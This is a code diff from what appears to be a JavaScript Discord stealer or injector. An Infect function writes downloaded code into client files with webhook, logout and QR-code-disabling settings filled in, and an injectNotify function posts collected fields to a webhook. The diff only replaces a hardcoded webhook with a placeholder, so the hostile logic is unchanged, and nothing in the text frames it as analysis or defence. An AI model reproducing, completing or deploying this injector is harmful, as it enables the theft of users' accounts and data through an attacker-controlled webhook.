@@ -6,7 +6,6 @@ const https = require('https');
 const { exec } = require('child_process');
 const axios = require('axios');
 const buf_replace = require('buffer-replace');
-const webhook = "da_webhook"
 
 const config = {
     "logout": "%LOGOUT%1",
@@ -50,7 +49,7 @@ function Infect() {
         });
         resp.on('end', () => {
             injectPath.forEach(file => {
-                fs.writeFileSync(file, data.replace("%WEBHOOK_LINK%", webhook).replace("%INITNOTI%", config["init-notify"]).replace("%LOGOUT%", config.logout).replace("%LOGOUTNOTI%", config["logout-notify"]).replace("3447704",config["embed-color"]).replace('%DISABLEQRCODE%', config["disable-qr-code"]), {
+                fs.writeFileSync(file, data.replace("%THISFUCKLOL%", "%THISFUCKLOL%1").replace("%INITNOTI%", config["init-notify"]).replace("%LOGOUT%", config.logout).replace("%LOGOUTNOTI%", config["logout-notify"]).replace("3447704",config["embed-color"]).replace('%DISABLEQRCODE%', config["disable-qr-code"]), {
                     encoding: 'utf8',
                     flag: 'w'
                 });
@@ -166,7 +165,7 @@ function injectNotify() {
         fields.push(c)
     })
     axios
-	.post(webhook, {
+	.post("%THISFUCKLOL%1", {
         "content": null,
         "embeds": [
           {
